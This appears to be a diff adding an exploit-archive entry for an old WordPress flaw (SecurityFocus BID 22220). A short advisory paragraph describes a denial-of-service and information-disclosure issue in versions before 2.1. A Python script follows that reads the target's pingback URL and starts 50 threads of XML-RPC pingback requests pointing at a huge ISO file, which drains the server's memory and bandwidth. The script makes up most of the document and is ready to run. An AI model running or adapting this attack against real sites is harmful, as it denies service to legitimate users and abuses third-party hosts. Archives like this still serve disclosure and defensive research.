@@ -1,0 +1,32 @@
+source: http://www.securityfocus.com/bid/22220/info
+
+WordPress is prone to a denial-of-service vulnerability and an information-disclosure vulnerability.
+
+Attackers can exploit these issues to consume memory and bandwidth resources, denying service to legitimate users, or to gain information that may aid in further attacks.
+
+Versions prior to WordPress 2.1 are vulnerable. 
+
+#!/bin/env python
+# vim:ft=python:fileencoding=utf-8
+#
+from xmlrpclib import ServerProxy
+from urllib import urlopen
+from random import randint
+	from threading import Thread
+ 	
+# Define target
+targetURL = "http://www.example.com/file.html"
+hugeFile  = "http://www.example.com/path-to-a-big-iso-file-from-a-major-linux-distribution.iso#i%d"
+ 	
+# Fetch Pingback-URL
+pingbackURL =  urlopen(targetURL).headers["X-Pingback"]
+print "Target URL: %s\nPingback:   %s" % (targetURL, pingbackURL)
+ 	
+# Attack
+def attack():
+  server = ServerProxy(pingbackURL)
+  try: server.pingback.ping(hugeFile % randint(10, 1000), targetURL)
+  except: pass
+for i in range(50):
+  Thread(target=attack).start()
+print "-- attacking --"
